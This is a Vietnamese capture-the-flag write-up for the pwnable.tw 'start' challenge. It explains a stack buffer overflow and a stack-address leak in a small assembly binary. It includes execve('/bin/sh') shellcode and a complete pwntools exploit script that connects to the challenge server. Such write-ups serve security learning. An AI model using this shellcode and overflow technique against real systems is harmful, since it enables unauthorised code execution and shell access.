# Start
just a start

### Checksec:
![image](https://github.com/vuhz/CTF/assets/90823042/264db6d0-be83-490d-b31f-938dfa40ca5f)

### Code:
```asm
 0x08048060 <+0>:     push   esp
 0x08048061 <+1>:     push   0x804809d
 0x08048066 <+6>:     xor    eax,eax
 0x08048068 <+8>:     xor    ebx,ebx
 0x0804806a <+10>:    xor    ecx,ecx
 0x0804806c <+12>:    xor    edx,edx
 0x0804806e <+14>:    push   0x3a465443
 0x08048073 <+19>:    push   0x20656874
 0x08048078 <+24>:    push   0x20747261
 0x0804807d <+29>:    push   0x74732073
 0x08048082 <+34>:    push   0x2774654c
 0x08048087 <+39>:    mov    ecx,esp
 0x08048089 <+41>:    mov    dl,0x14
 0x0804808b <+43>:    mov    bl,0x1
 0x0804808d <+45>:    mov    al,0x4
 0x0804808f <+47>:    int    0x80
 0x08048091 <+49>:    xor    ebx,ebx
 0x08048093 <+51>:    mov    dl,0x3c
 0x08048095 <+53>:    mov    al,0x3
 0x08048097 <+55>:    int    0x80
 0x08048099 <+57>:    add    esp,0x14
 0x0804809c <+60>:    ret
```

Code bằng assembly, nên ko thể dùng ret2win hay libc được, nhưng có NX disabled, ta có thể inject shellcode vào rồi chạy.

Ở hai lần gọi syscall (int 0x80), tìm trong [Syscall x86](https://x86.syscall.sh/) thì syscall đầu tiên là print đống text trên stack, rồi syscall thứ hai là read vào 0x3c bytes. Nhưng vì syscall read lấy `$ecx` là buffer, và tại thời điểm đó `$ecx` vẫn đang trỏ đến đầu stack, nên ta có thể sử dụng lỗi buffer overflow để return lại đầu chương trình.

![image](https://github.com/vuhz/CTF/assets/90823042/13e1981d-c660-40f3-b573-86a8bd10a077)
<p align="center">offset đến return là 0x14 bytes</p>

Nhưng nếu muốn chạy shellcode thì phải leak được stack đúng ko?. Để ý là sau return có một giá trị trên stack là địa chỉ của stack sau nó, và ở syscall đầu tiên:

![image](https://github.com/vuhz/CTF/assets/90823042/b64f22fd-13a9-4c44-8cfe-f401f0ef4e80)

ta lại chuyển pointer stack vào `$ecx` một lần nữa, và khi gọi syscall, ta có thể leak được stack. Vậy ta chỉ cần padding đến return và nhảy vào `_start+39`.

### Shellcode payload:
```asm
xor eax, eax
push eax        
push 6845231 
push 1852400175 
mov ebx, esp    
xor ecx, ecx    
xor edx, edx    
mov al, 0xb     
int 0x80
```
Vì độ dài của shellcode mình là 23 nên ko thể input vào đầu buffer, nên mình sẽ lấy stackleak + offset để trỏ đến shellcode của mình (sau ret). Đây là payload mẫu:
**`payload = padding + (stack_leak + offset) + shellcode`**

### Full payload:
```py
#!/usr/bin/python3

from pwn import *

exe = ELF('start', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b*_start+55
            c
        ''')
        input()


if args.REMOTE:
    p = remote('chall.pwnable.tw', 10000)
else:
    p = process(exe.path)
GDB()

payload = b'A' * 20
payload += p32(0x08048087)
sa(b'CTF:', payload)
stack = p.recv(4)
info(f"Stack leak: {hex(u32(stack))}")

shell = asm("""
xor eax, eax
push eax        
push 6845231 
push 1852400175 
mov ebx, esp    
xor ecx, ecx    
xor edx, edx    
mov al, 0xb     
int 0x80 
""", arch = 'i386')

payload = b'A' * 20 + p32(u32(stack) + 20) + shell
s(payload)
p.interactive()
```

